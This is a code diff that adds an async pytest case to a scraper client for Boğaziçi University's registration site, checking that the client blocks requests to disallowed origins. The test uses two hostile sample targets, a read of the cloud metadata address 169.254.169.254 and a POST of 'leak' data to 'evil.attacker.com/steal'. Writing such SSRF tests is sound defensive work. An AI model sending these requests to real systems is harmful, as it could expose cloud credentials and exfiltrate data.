@@ -789,3 +789,18 @@ class TestScraperFlow:
                     cached_departments=None,
                     target_departments=["CMPE"],
                 )
+
+    @pytest.mark.asyncio
+    async def test_client_rejects_ssrf_disallowed_origin(self) -> None:
+        async_client = httpx.AsyncClient(
+            transport=httpx.MockTransport(lambda r: httpx.Response(200)),
+            base_url="https://registration.bogazici.edu.tr",
+        )
+        async with BounScraperClient(
+            http_client=async_client, min_jitter=0, max_jitter=0
+        ) as client:
+            with pytest.raises(BounHttpError, match="Disallowed target URL origin"):
+                await client.get("http://169.254.169.254/latest/meta-data")
+            with pytest.raises(BounHttpError, match="Disallowed target URL origin"):
+                await client.post("https://evil.attacker.com/steal", data={"leak": "1"})
+
